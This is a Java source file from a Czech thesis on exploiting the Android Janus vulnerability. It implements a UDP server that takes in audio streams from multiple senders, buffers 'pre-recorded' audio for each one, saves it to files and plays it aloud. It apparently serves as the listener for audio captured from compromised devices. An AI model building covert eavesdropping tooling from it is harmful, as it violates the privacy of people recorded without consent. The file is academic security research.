// Tento kod je soucast diplomove prace Vyuziti zranitelnosti Janus na operacnim systemu Android
// Autor: Bc. Vit Soucek
//
// Pouzite zdroje:
//    - zminene primo v kodu v dokumentacnich komentarich


package com.company;

import javax.sound.sampled.*;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;
import java.util.*;

public class ServerThread implements Runnable {

    private int port = 50005;

    volatile boolean status = true;
    volatile String activeConnection = "";

    Map<String, Connection> connections;

    private Thread t;

    private int sampleRate = 44100;//16000;//8000;//44100;//44100;
    private int bufferLen = 26880 * 20;//960*20;//512*2;
    private byte[] receiveData = new byte[bufferLen];

    private SourceDataLine sourceDataLine;
    private AudioFormat format;
    private DataLine.Info dataLineInfo;
    private FloatControl volumeControl;

    private DatagramSocket serverSocket = null;

    int ringBufferSize;
    int maxMemorySize;
    int maxConnections;

    int connectionIncreaseCoefficient;

    /**
     * Constructor.
     * Initialize max number of connections and calculate the buffer sizes for connections
     * @param maxMemory Maximum memory size that can be used by the thread to pre-record audio.
     */
    public ServerThread(int maxMemory) {
        maxMemorySize = maxMemory * 1000000;
        maxConnections = 10;
        ringBufferSize = maxMemorySize / maxConnections; // Reserve the memory for 10 connections
        System.out.println("[-] Buffers size set to: " + ringBufferSize + " B. (~ prerecorded " +
                ((ringBufferSize) / (2 * 44100)) / 60 + " minutes and " + ((ringBufferSize) / (2 * 44100)) % 60 +
                " seconds per connection)");
        connectionIncreaseCoefficient = 10;
    }

    /**
     * Main method of the ServerThread.
     * Initialize the audio system and then in the loop:
     *   - receive data
     *   - save the data to the connection buffer
     *   - optionally write the data to the file and/or play them in speakers
     *
     * This method was inspired by the StackOverflow question "Save live audio streaming to wave file in Java"
     * and its accepted answer.
     *     authors: Sadegh Bakhshandeh Sajjad, dieter
     *     available at: https://stackoverflow.com/questions/49811545/save-live-audio-streaming-to-wave-file-in-java
     */
    @Override
    public void run() {

        try {
            serverSocket = new DatagramSocket(port);
        } catch (SocketException e) {
            e.printStackTrace();
        }

        /*
         * Formula for lag = (byte_size/sample_rate)*2
         * Byte size 9728 will produce ~ 0.45 seconds of lag. Voice slightly broken.
         * Byte size 1400 will produce ~ 0.06 seconds of lag. Voice extremely broken.
         * Byte size 4000 will produce ~ 0.18 seconds of lag. Voice slightly more broken then 9728.
         *
         * SAMPLE: 16000 both (android+server) + BUFFER SIZE: 1024
         * 44100 + 1024
         * 44100+862
         * 8000+512
         */

        // Initialize Audio player
        initializeAudioPlayer();

        // Initialize connection list
        connections = new HashMap<>();
        //connectionNames = new TreeSet<>();

        // Run until user changes status
        while (status) {

            // Receive packet with some data
            DatagramPacket packet = receivePacket();

            // Find who sent the packet
            String senderID = getSenderID(packet);

            if (!connections.containsKey(senderID)) {
                System.out.println("[-] New connection: " + senderID);
                if (connections.size() > maxConnections) {
                    resizeBuffers(false);
                }
                connections.put(senderID, new Connection(senderID, ringBufferSize));
            }

            Connection currentConnection = connections.get(senderID);

            // If no connection is active, make this one active
            if (activeConnection.equals("")) {
                activeConnection = senderID;
                System.out.println("[-] Active connection: " + activeConnection);
            }

            byte[] data = packet.getData();
            int dataLength = packet.getLength();

            if (currentConnection.isRecording()) {
                toFile(data, dataLength, currentConnection);
            } else {
                toRingBuffer(data, dataLength, currentConnection);
            }

            // If this connection is supposed to be active,
            // play the received sound on the speakers
            if (senderID.equals(activeConnection)) {
                toSpeaker(data, dataLength);
                Arrays.fill(receiveData, (byte) 0);
            }
        }

        // Exit the application
        System.out.println("[-] Thread exiting");
        sourceDataLine.drain();
        sourceDataLine.close();
    }

    /**
     * Resize the ring buffers of all the connections.
     *
     * The initial memory limit must be respected, so:
     *     => In case there is too much connections, lower the buffer sizes.
     *     => In case there is too few connections, increase the buffer sizes.
     *
     * Buffer size is always altered by the same coefficient:
     *     size = size * coeff
     *       or
     *     size = size / coeff
     * @param increaseSize Flag saying whether to increase or decrease the size
     */
    private void resizeBuffers(boolean increaseSize) {
        System.out.println("[-] Resizing buffers");
        if (increaseSize) {
            maxConnections /= connectionIncreaseCoefficient;
        } else {
            if (ringBufferSize <= 1) {
                System.out.println("Out of allowed memory usage. Please consider deleting some of the connections");
                return;
            }
            maxConnections *= connectionIncreaseCoefficient;
        }
        ringBufferSize = maxMemorySize / maxConnections;
        for (String connectionID : connections.keySet()) {
            connections.get(connectionID).resizeBuffer(ringBufferSize);
        }
        System.out.println("[-] Buffers resized to: " + ringBufferSize + " B. (~" + (ringBufferSize) / (2 * 44100) + " pre-recorded seconds)");
    }

    /**
     * Remove connection from the list.
     * @param connectionID ID of the connection to be removed
     */
    public void removeConnection(String connectionID) {
        if (connectionID.equals(activeConnection)) {
            activeConnection = "";
        }

        if (connections.remove(connectionID) != null) {
            System.out.println("[-] Connection " + connectionID + " removed.");
            if (connections.size() < (maxConnections / connectionIncreaseCoefficient)) {
                resizeBuffers(true);
            }
        } else
            System.out.println("[-] Connection does not exist");
    }

    /**
     * Write the chunk of data to the output file.
     * @param data Data to be written
     * @param dataLength Length of the data to be written
     * @param connection Connection which the data belong to
     */
    private void toFile(byte[] data, int dataLength, Connection connection) {
        try {
            connection.wfWriter.write(data, 0, dataLength);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Write the chunk of data to the ring buffer oof the
     * connection the data came from
     * @param data Data to be written
     * @param dataLength Length of the data to be written
     * @param conn Connection which the data belong to
     */
    private void toRingBuffer(byte[] data, int dataLength, Connection conn) {
        conn.writeToBuffer(data, dataLength);
    }

    /**
     * Start the thread.
     */
    void start() {
        System.out.println("[-] Starting the server thread.");
        if (t == null) {
            t = new Thread(this);
            t.start();
        }
    }

    /**
     * Receive packet from any source.
     *
     * @return DatagramPacket with received data.
     */
    private DatagramPacket receivePacket() {
        DatagramPacket packet = new DatagramPacket(receiveData, receiveData.length);
        try {
            serverSocket.receive(packet);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return packet;
    }

    /**
     * Initialize all object needed to play audio.
     * This method is inspired by theStackOverflow question "Stream Live Android Audio To Server"
     *     author (the question and the answer as well): chuckliddell0
     *     available at: https://stackoverflow.com/questions/15349987/stream-live-android-audio-to-server
     */
    private void initializeAudioPlayer() {
        format = new AudioFormat(sampleRate, 16, 1, true, false);
        dataLineInfo = new DataLine.Info(SourceDataLine.class, format);

        try {
            sourceDataLine = (SourceDataLine) AudioSystem.getLine(dataLineInfo);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }

        try {
            sourceDataLine.open(format);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }
        sourceDataLine.start();

        volumeControl = (FloatControl) sourceDataLine.getControl(FloatControl.Type.MASTER_GAIN);
        volumeControl.setValue(volumeControl.getMaximum());
    }

    /**
     * Parse the received packet and get its
     * source IP address and port.
     *
     * @param packet Received DatagramPacket with data.
     * @return IP and port as String in format IP:port
     */
    private String getSenderID(DatagramPacket packet) {
        String addr = packet.getAddress().toString();
        if (addr.charAt(0) == '/') {
            addr = addr.substring(1);
        }
        int port = packet.getPort();
        return addr + ":" + port;
    }

    /**
     * Play the received data on the speaker.
     *
     * @param soundbytes Data to play.
     * @param length     Length of the data o play/
     */
    public void toSpeaker(byte[] soundbytes, int length) {
        try {
            sourceDataLine.write(soundbytes, 0, length);
        } catch (Exception e) {
            System.out.println("Not working in speakers...");
            e.printStackTrace();
        }
    }
}
